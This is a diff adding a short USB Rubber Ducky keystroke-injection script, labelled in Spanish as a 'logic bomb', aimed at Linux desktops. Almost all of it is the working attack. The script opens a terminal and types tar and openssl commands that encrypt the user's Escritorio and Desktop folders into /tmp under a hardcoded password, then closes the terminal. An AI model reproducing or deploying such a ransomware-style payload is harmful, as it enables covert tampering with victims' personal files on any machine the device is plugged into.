@@ -1,0 +1,20 @@
+# Bomba logica creada por Sergigm87
+REM Este es un script Ducky para Linux
+DELAY 1000
+REM Minimiza todas las ventanas
+WINDOWS D
+DELAY 500
+CTRL-ALT T
+DELAY 2000
+
+
+# ENCRIPTACION DEL ESCRITORIO
+REM Cifra la carpeta del usuario utilizando la contraseña proporcionada
+STRING tar czf - ~/Escritorio | openssl enc -aes-256-cbc -salt -pass pass:4qql3 -out /tmp/encrypted_Escritorio.tar.gz
+DELAY 500
+ENTER
+STRING tar czf - ~/Desktop | openssl enc -aes-256-cbc -salt -pass pass:4qql3 -out /tmp/encrypted_Escritorio.tar.gz
+DELAY 500
+ENTER
+STRING exit
+ENTER
